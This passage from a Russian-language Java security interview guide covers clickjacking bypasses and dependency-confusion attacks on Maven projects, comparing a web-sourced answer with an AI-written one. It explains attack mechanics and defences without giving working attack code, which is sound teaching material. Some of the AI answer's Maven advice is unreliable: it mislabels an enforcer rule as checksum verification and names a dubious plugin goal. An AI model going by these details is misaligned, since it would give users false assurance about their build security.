- `sandbox` атрибут: `<iframe sandbox="allow-scripts">` — JavaScript разрешён, но навигация parent-фрейма заблокирована
- Двойной iframe: внешний iframe блокирует навигацию вложенного
- `onBeforeUnload`: атакующий перехватывает событие перехода и показывает диалог

OWASP явно указывает: полагаться только на JavaScript-защиту нельзя.

**Расхождений между источниками не обнаружено.** OWASP Clickjacking Cheat Sheet и документация Spring Security согласованно рекомендуют использовать оба заголовка для максимального покрытия браузеров.

---

### Вопрос 60. Что такое Dependency Confusion (атака на цепочку поставок через подмену пакетов)? Как она работает применительно к Maven-проектам и как защититься?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies — medium.com](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) (Alex Birsan, 2021)

Dependency Confusion — тип атаки на цепочку поставок, при которой атакующий публикует вредоносный пакет с тем же именем, что и внутренний (приватный) пакет компании, но в публичном репозитории (Maven Central, npm, PyPI).

Механизм: инструменты сборки (npm, pip, Maven) при настроенных нескольких репозиториях нередко предпочитают публичный пакет с более высокой версией над приватным. Атакующий публикует пакет `com.example:internal-auth:9999.0.0` на Maven Central — и клиентские машины разработчиков и CI/CD начинают скачивать вредоносный код вместо легитимного приватного артефакта.

Alex Birsan в 2021 году использовал эту технику против Apple, Microsoft, PayPal, Shopify и десятков других компаний, получив баунти более $130 000.

#### Ответ от Claude

**Что такое Dependency Confusion**

Dependency Confusion (также: namespace confusion, substitution attack) — атака на цепочку поставок (supply chain attack), при которой эксплуатируется поведение менеджеров пакетов при разрешении зависимостей из нескольких источников.

**Механизм атаки в Maven:**

1. Компания использует приватный Nexus/Artifactory-репозиторий с артефактом `com.acme:internal-payments-lib:1.2.0`.
2. `pom.xml` или `settings.xml` настроен с несколькими репозиториями: приватным и Maven Central.
3. Атакующий регистрирует тот же groupId `com.acme` (или схожий) на Maven Central и публикует `com.acme:internal-payments-lib:99.0.0` с вредоносным кодом.
4. Если Maven настроен с приоритетом Maven Central или ищет максимальную версию — он скачивает `99.0.0` из Central вместо `1.2.0` из приватного репозитория.

**Как Maven разрешает зависимости**

По умолчанию Maven обращается к репозиториям в порядке, указанном в `pom.xml`/`settings.xml`. Если артефакт найден в первом репозитории — используется он. Если приватный репозиторий стоит первым — атака не работает. Проблема возникает при неправильном порядке или при mirror-конфигурации, перенаправляющей все запросы в Central.

**Защита:**

**1. Явная блокировка загрузки внутренних артефактов из внешних репозиториев:**

```xml
<!-- settings.xml: приватный репозиторий первым, Central последним -->
<profiles>
  <profile>
    <repositories>
      <repository>
        <id>internal</id>
        <url>https://nexus.acme.com/repository/maven-internal/</url>
        <releases><enabled>true</enabled></releases>
      </repository>
      <repository>
        <id>central</id>
        <url>https://repo.maven.apache.org/maven2</url>
      </repository>
    </repositories>
  </profile>
</profiles>
```

**2. Mirror с блокировкой внутренних groupId в public:**

В Nexus/Artifactory настроить routing rules: запросы к `com.acme.*` никогда не идут во внешние репозитории.

**3. Верификация контрольных сумм и подписей:**

```xml
<!-- Включить проверку checksum в Maven -->
<!-- maven-enforcer-plugin: проверка хэшей зависимостей -->
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-enforcer-plugin</artifactId>
    <configuration>
        <rules>
            <requireUpperBoundDeps/>
        </rules>
    </configuration>
</plugin>
```

**4. Dependency pinning и SBOM:**

Использовать Maven Dependency Plugin для генерации Software Bill of Materials (SBOM) и фиксировать точные версии и хэши через `maven-dependency-plugin:dependency-check`.

**5. Регистрация внутренних имён в публичных репозиториях:**

Превентивно зарегистрировать собственные groupId на Maven Central (даже без публикации реальных артефактов), чтобы атакующий не мог занять пространство имён.

**6. Мониторинг:**

Настроить оповещения при появлении пакетов с именами внутренних артефактов на Maven Central через инструменты типа OWASP Dependency-Check или Sonatype Lifecycle.

**Расхождение между источниками:** В оригинальном исследовании Birsan атака описана преимущественно для npm и PyPI, поскольку они более распространены в публичных репозиториях. Для Maven ситуация сложнее: groupId требует верификации домена на Maven Central, что снижает риск, но не устраняет его полностью — при опечатках в groupId (typosquatting) или незарегистрированных пространствах имён атака остаётся актуальной.

---
